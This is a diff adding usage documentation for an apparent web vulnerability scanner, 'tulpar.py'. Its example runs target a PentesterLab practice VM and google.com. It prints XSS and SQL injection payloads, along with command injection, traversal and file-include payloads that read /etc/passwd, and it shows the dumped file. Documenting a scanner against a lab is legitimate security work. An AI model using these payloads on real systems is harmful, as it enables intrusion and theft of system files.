@@ -1,0 +1,371 @@
+-Sql Injection (GET Method)
+-XSS (GET Method)
+-Crawl
+-E-mail Disclosure
+-Credit Card Disclosure
+-Whois
+-Command Injection (GET Method)
+-Directory Traversal (GET Method)
+-File Include (GET Method)
+-Server Information
+-Technology Information
+-X-Content-Type Check
+-X-XSS-Protection Check
+-TCP Port Scanner
+-robots.txt Check
+-URL  Encode
+-Certification Information
+-Available Methods
+-Cyber Threat Intelligence
+-IP2Location
+-File Input Available Check
+
+
+
+python-whois
+Futures
+requests-2.13.0
+lxml
+Telnetlib
+
+
+Usage: whois
+python tulpar.py  whois https://google.com
+google.com
+[+]URL: https://google.com 
+==========
+[+]Domain:  google.com
+[+]Update time:  [datetime.datetime(2011, 7, 20, 16, 55, 31), u'2015-06-12T10:38:52-0700']
+[+]Expiration time:  [datetime.datetime(2020, 9, 14, 4, 0), u'2020-09-13T21:00:00-0700']
+[+]Name server:  [u'NS1.GOOGLE.COM', u'NS2.GOOGLE.COM', u'NS3.GOOGLE.COM', u'NS4.GOOGLE.COM', u'ns3.google.com', u'ns2.google.com', u'ns4.google.com', u'ns1.google.com']
+[+]Email:  [u'abusecomplaints@markmonitor.com', u'contact-admin@google.com', u'dns-admin@google.com']
+
+Usage: xss
+python tulpar.py xss http://192.168.213.168/xss/example1.php?name=hacker
+192.168.213.168
+[+]URL: http://192.168.213.168/xss/example1.php?name=hacker 
+==========
+[+]XSS payload:  <script>alert(XSS)</script>
+[+]XSS URL:  http://192.168.213.168/xss/example1.php?name=<script>alert(XSS)</script>
+[+]XSS payload:  <sCript>alert(XSS)</sCript>
+[+]XSS URL:  http://192.168.213.168/xss/example1.php?name=<sCript>alert(XSS)</sCript>
+[+]XSS payload:  <scriPt>alert(XSS)</scriPt>
+[+]XSS URL:  http://192.168.213.168/xss/example1.php?name=<scriPt>alert(XSS)</scriPt>
+
+Usage:sql
+python tulpar.py sql http://192.168.213.168/sqli/example1.php?name=root
+192.168.213.168
+[+]URL: http://192.168.213.168/sqli/example1.php?name=root 
+==========
+[+]Sqli paylaod:  '
+[+]Sqli URL:  http://192.168.213.168/sqli/example1.php?name='
+[+]Sqli paylaod:  ' or '1=1
+[+]Sqli URL:  http://192.168.213.168/sqli/example1.php?name=' or '1=1
+[+]Sqli paylaod:  ' and '1'='1' #
+[+]Sqli URL:  http://192.168.213.168/sqli/example1.php?name=' and '1'='1' #
+[+]Sqli paylaod:  ' and 1=1 #
+[+]Sqli URL:  http://192.168.213.168/sqli/example1.php?name=' and 1=1 #
+[+]Sqli paylaod:  ' #
+[+]Sqli URL:  http://192.168.213.168/sqli/example1.php?name=' #
+[+]Sqli paylaod:  ' and '1'='1
+[+]Sqli URL:  http://192.168.213.168/sqli/example1.php?name=' and '1'='1
+
+Usage: fuzzing
+python tulpar.py fuzzing http://192.168.213.168
+192.168.213.168
+[+]URL: http://192.168.213.168 
+==========
+
+Usage:e-mail
+python tulpar.py e-mail http://192.168.213.168
+192.168.213.168
+[+]URL: http://192.168.213.168 
+==========
+[+]E-mail:  louis@pentesterlab.com
+
+Usage:credit-card
+python tulpar.py credit-card http://192.168.213.168
+192.168.213.168
+[+]URL: http://192.168.213.168 
+==========
+
+Usage:links
+python tulpar.py links http://192.168.213.168
+192.168.213.168
+[+]URL: http://192.168.213.168 
+==========
+
+Usage:portscanner
+ python tulpar.py portscanner http://192.168.213.168/
+192.168.213.168
+[+]URL: http://192.168.213.168/ 
+==========
+192.168.213.168
+Start port: 0
+Finish port: 100
+[+] 22  -  SSH-2.0-OpenSSH_5.5p1 Debian-6+squeeze3
+[+] 80  - 
+
+Usage:urlEncode
+python tulpar.py urlEncode http://192.168.213.168
+192.168.213.168
+[+]URL: http://192.168.213.168 
+==========
+[+]Encoded URL: %68%74%74%70%3A%2F%2F%31%39%32%2E%31%36%38%2E%32%31%33%2E%31%36%38
+
+
+Usage:cyberthreatintelligence
+python tulpar.py cyberthreatintelligence http://google.com
+google.com
+[+]URL: http://google.com 
+==========
+/Users/anilbaranyelken/Library/Python/2.7/lib/python/site-packages/requests/packages/urllib3/connectionpool.py:852: InsecureRequestWarning: Unverified HTTPS request is being made. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings
+  InsecureRequestWarning)
+
+
+
+Usage:commandInjection
+python tulpar.py commandInjection http://192.168.213.168/commandexec/example1.php?ip=127.0.0.1
+192.168.213.168
+[+]URL: http://192.168.213.168/commandexec/example1.php?ip=127.0.0.1 
+==========
+[+]Command injection possible, payload: ;cat%20/etc/passwd
+Response:  <!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <title>PentesterLab &raquo; Web for Pentester</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Web For Pentester">
+    <meta name="author" content="Louis Nyffenegger (louis@pentesterlab.com)">
+
+    <!-- Le styles -->
+    <link href="/css/bootstrap.css" rel="stylesheet">
+
+    <style type="text/css">
+      body {
+        padding-top: 60px;
+        padding-bottom: 40px;
+      }
+    </style>
+    <link href="/css/bootstrap-responsive.css" rel="stylesheet">
+
+  </head>
+
+  <body>
+
+    <div class="navbar navbar-inverse navbar-fixed-top">
+      <div class="navbar-inner">
+        <div class="container">
+          <a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+          </a>
+          <a class="brand" href="https://pentesterlab.com/">PentesterLab.com</a>
+          <div class="nav-collapse collapse">
+            <ul class="nav">
+              <li class="active"><a href="/">Home</a></li>
+            </ul>
+          </div><!--/.nav-collapse -->
+        </div>
+      </div>
+    </div>
+
+    <div class="container">
+
+
+
+<pre>
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+mysql:x:101:103:MySQL Server,,,:/var/lib/mysql:/bin/false
+sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
+openldap:x:103:106:OpenLDAP Server Account,,,:/var/lib/ldap:/bin/false
+user:x:1000:1000:Debian Live user,,,:/home/user:/bin/bash
+</pre>
+      <footer>
+        <p>&copy; PentesterLab 2013</p>
+      </footer>
+    </div> <!-- /container -->
+  </body>
+</html>
+
+Usage:directoryTraversal
+python tulpar.py directoryTraversal http://192.168.213.168/dirtrav/example1.php?file=hacker.png
+192.168.213.168
+[+]URL: http://192.168.213.168/dirtrav/example1.php?file=hacker.png 
+==========
+[+]Directory traversal possible, payload: ../../../../../../etc/passwd
+Response:  root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+mysql:x:101:103:MySQL Server,,,:/var/lib/mysql:/bin/false
+sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
+openldap:x:103:106:OpenLDAP Server Account,,,:/var/lib/ldap:/bin/false
+user:x:1000:1000:Debian Live user,,,:/home/user:/bin/bash
+
+
+Usage:fileInclude
+python tulpar.py fileInclude http://192.168.213.168/fileincl/example1.php?page=intro.php
+192.168.213.168
+[+]URL: http://192.168.213.168/fileincl/example1.php?page=intro.php 
+==========
+[+]File include possible, payload: ../../../../../../etc/passwd
+Response:  <!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <title>PentesterLab &raquo; Web for Pentester</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Web For Pentester">
+    <meta name="author" content="Louis Nyffenegger (louis@pentesterlab.com)">
+
+    <!-- Le styles -->
+    <link href="/css/bootstrap.css" rel="stylesheet">
+
+    <style type="text/css">
+      body {
+        padding-top: 60px;
+        padding-bottom: 40px;
+      }
+    </style>
+    <link href="/css/bootstrap-responsive.css" rel="stylesheet">
+
+  </head>
+
+  <body>
+
+    <div class="navbar navbar-inverse navbar-fixed-top">
+      <div class="navbar-inner">
+        <div class="container">
+          <a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+          </a>
+          <a class="brand" href="https://pentesterlab.com/">PentesterLab.com</a>
+          <div class="nav-collapse collapse">
+            <ul class="nav">
+              <li class="active"><a href="/">Home</a></li>
+            </ul>
+          </div><!--/.nav-collapse -->
+        </div>
+      </div>
+    </div>
+
+    <div class="container">
+
+
+
+
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+mysql:x:101:103:MySQL Server,,,:/var/lib/mysql:/bin/false
+sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
+openldap:x:103:106:OpenLDAP Server Account,,,:/var/lib/ldap:/bin/false
+user:x:1000:1000:Debian Live user,,,:/home/user:/bin/bash
+
+      <footer>
+        <p>&copy; PentesterLab 2013</p>
+      </footer>
+
+    </div> <!-- /container -->
+
+
+  </body>
+</html>
+
+Usage:headerCheck
+python tulpar.py headerCheck http://192.168.213.168
+192.168.213.168
+[+]URL: http://192.168.213.168 
+==========
+[+]Server:  Apache/2.2.16 (Debian)
+[+]Technology:  PHP/5.3.3-7+squeeze15
+[+]No XSS protection
+
+Usage:certificate
+python tulpar.py certificate https://google.com
+google.com
+[+]URL: https://google.com 
+==========
+google.com
+[+]Certificate Serial Number:  7DBD8005B56D0B01
+[+]Certificate SSL Version: 3
+[+]Certificate: {'crlDistributionPoints': (u'http://pki.google.com/GIAG2.crl',), 'subjectAltName': (('DNS', '*.google.com'), ('DNS', '*.android.com'), ('DNS', '*.appengine.google.com'), ('DNS', '*.cloud.google.com'), ('DNS', '*.db833953.google.cn'), ('DNS', '*.g.co'), ('DNS', '*.gcp.gvt2.com'), ('DNS', '*.google-analytics.com'), ('DNS', '*.google.ca'), ('DNS', '*.google.cl'), ('DNS', '*.google.co.in'), ('DNS', '*.google.co.jp'), ('DNS', '*.google.co.uk'), ('DNS', '*.google.com.ar'), ('DNS', '*.google.com.au'), ('DNS', '*.google.com.br'), ('DNS', '*.google.com.co'), ('DNS', '*.google.com.mx'), ('DNS', '*.google.com.tr'), ('DNS', '*.google.com.vn'), ('DNS', '*.google.de'), ('DNS', '*.google.es'), ('DNS', '*.google.fr'), ('DNS', '*.google.hu'), ('DNS', '*.google.it'), ('DNS', '*.google.nl'), ('DNS', '*.google.pl'), ('DNS', '*.google.pt'), ('DNS', '*.googleadapis.com'), ('DNS', '*.googleapis.cn'), ('DNS', '*.googlecommerce.com'), ('DNS', '*.googlevideo.com'), ('DNS', '*.gstatic.cn'), ('DNS', '*.gstatic.com'), ('DNS', '*.gvt1.com'), ('DNS', '*.gvt2.com'), ('DNS', '*.metric.gstatic.com'), ('DNS', '*.urchin.com'), ('DNS', '*.url.google.com'), ('DNS', '*.youtube-nocookie.com'), ('DNS', '*.youtube.com'), ('DNS', '*.youtubeeducation.com'), ('DNS', '*.yt.be'), ('DNS', '*.ytimg.com'), ('DNS', 'android.clients.google.com'), ('DNS', 'android.com'), ('DNS', 'developer.android.google.cn'), ('DNS', 'developers.android.google.cn'), ('DNS', 'g.co'), ('DNS', 'goo.gl'), ('DNS', 'google-analytics.com'), ('DNS', 'google.com'), ('DNS', 'googlecommerce.com'), ('DNS', 'source.android.google.cn'), ('DNS', 'urchin.com'), ('DNS', 'www.goo.gl'), ('DNS', 'youtu.be'), ('DNS', 'youtube.com'), ('DNS', 'youtubeeducation.com'), ('DNS', 'yt.be')), 'notBefore': u'Aug 15 16:21:42 2017 GMT', 'caIssuers': (u'http://pki.google.com/GIAG2.crt',), 'OCSP': (u'http://clients1.google.com/ocsp',), 'serialNumber': u'7DBD8005B56D0B01', 'notAfter': 'Nov  7 16:05:00 2017 GMT', 'version': 3L, 'subject': ((('countryName', u'US'),), (('stateOrProvinceName', u'California'),), (('localityName', u'Mountain View'),), (('organizationName', u'Google Inc'),), (('commonName', u'*.google.com'),)), 'issuer': ((('countryName', u'US'),), (('organizationName', u'Google Inc'),), (('commonName', u'Google Internet Authority G2'),))}
+
+Usage:method
+python tulpar.py method http://192.168.213.168
+192.168.213.168
+[+]URL: http://192.168.213.168 
+==========
+192.168.213.168
+Methods:  
+
+Usage:IP2Location
+python tulpar.py IP2Location http://139.162.128.50
+139.162.128.50
+[+]URL: http://139.162.128.50 
+==========
+City: 
+
+Usage:FileInputAvailable
+python tulpar.py FileInputAvailable http://192.168.213.168
+192.168.213.168
+[+]URL: http://192.168.213.168 
+==========
+
+Usage:full
+http://192.168.213.168 [+]Domain: 168 [+]Update time: None [+]Expiration time: None [+]Name server: None [+]Email: None [+]Encoded URL:%68%74%74%70%3A%2F%2F%31%39%32%2E%31%36%38%2E%32%31%33%2E%31%36%38 [-]Url: http://192.168.213.168/robots.txt [-]Url: http://192.168.213.168/administrator/ [-]Url: http://192.168.213.168/cache/ [-]Url: http://192.168.213.168/cli/ [-]Url: http://192.168.213.168/components/ [-]Url: http://192.168.213.168/images/ [-]Url: http://192.168.213.168/includes/ [-]Url: http://192.168.213.168/installation/ [-]Url: http://192.168.213.168/language/ [-]Url: http://192.168.213.168/libraries/ [-]Url: http://192.168.213.168/logs/ [-]Url: http://192.168.213.168/media/ [-]Url: http://192.168.213.168/modules/ [-]Url: http://192.168.213.168/plugins/ [-]Url: http://192.168.213.168/templates/ [-]Url: http://192.168.213.168/tmp/ [+]No XSS protection [+]E-mail: louis@pentesterlab.com [+]This report contains: http://192.168.213.168 Date: 2017-08-29 ========= http://192.168.213.168 ,the last 48 hour haven't been reported on the blocklist for an attack on the SSH service. http://192.168.213.168 the last 48 hour haven't been reported on the blocklist for an attack on the mail service. http://192.168.213.168 the last 48 hour haven't been reported on the blocklist for an attack on the apache service. http://192.168.213.168 the last 48 hour haven't been reported on the blocklist for an attack on the IMAP and POP3 service. http://192.168.213.168 the last 48 hour have been reported on the blocklist for an attack on the FTP service. http://192.168.213.168  haven't been reported on the blocklist for an attack on the SIP, VOIP service http://192.168.213.168 the last 48 hour haven't been reported on the blocklist for RFI-Attacks, REG-Bots, IRC-Bots, BadBot attack. http://192.168.213.168 haven't been reported on the blocklist for IRC Bot. http://192.168.213.168 haven't been reported on the blocklist for using easy entry in Joomla,Wordpress.\nhttp://192.168.213.168  haven't been reported on the Emerging Threat Block IP. http://192.168.213.168  haven't been reported on the Emerging Threat Block IP. http://192.168.213.168  haven't been reported on the Binary Defence. http://192.168.213.168  haven't been reported on the Openphish. http://192.168.213.168  haven't been reported on the Zeustracker. http://192.168.213.168  haven't been reported on the Honeypot Project. [-]Website hasn't MasterCard! [-]Website hasn't a VISA card! [-]Website hasn't a AMEX card! [-]Website hasn't a DISCOVER card! [-]Sqli isn't available [-]XSS isn't available 
